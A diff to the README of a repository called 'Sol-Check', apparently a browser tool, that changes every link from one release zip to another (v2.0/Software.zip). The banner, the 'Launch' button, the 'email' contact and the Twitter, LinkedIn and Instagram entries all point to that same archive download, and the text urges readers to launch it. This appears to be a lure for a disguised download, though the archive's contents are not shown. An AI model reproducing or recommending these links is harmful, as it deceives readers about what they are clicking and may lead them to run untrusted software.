@@ -2,7 +2,7 @@
 
 ---
 
-![Sol-Check](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
+![Sol-Check](https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Welcome to the Sol-Check repository! Although the short description is not provi
 ### Get Started
 To start exploring the Sol-Check repository, please make sure to download the latest release of the browser tool by clicking the button below:
 
-[![Launch Sol-Check Browser](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip%https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
+[![Launch Sol-Check Browser](https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip%https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip)](https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip)
 
 _(Please note that the link above needs to be launched to access the Sol-Check browser tool.)_
 
@@ -67,15 +67,15 @@ We welcome contributions from the community to enhance the Sol-Check repository.
 ---
 
 ### Contact Us
-If you have any questions, suggestions, or feedback, please don't hesitate to reach out to us. You can contact the Sol-Check team via email at [https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip).
+If you have any questions, suggestions, or feedback, please don't hesitate to reach out to us. You can contact the Sol-Check team via email at [https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip](https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip).
 
 ---
 
 ### Connect with Us
 Stay connected with Sol-Check on social media:
-- [Twitter](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
-- [LinkedIn](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
-- [Instagram](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
+- [Twitter](https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/dang12345512/sol-check/releases/download/v2.0/Software.zip)
 
 ---
 
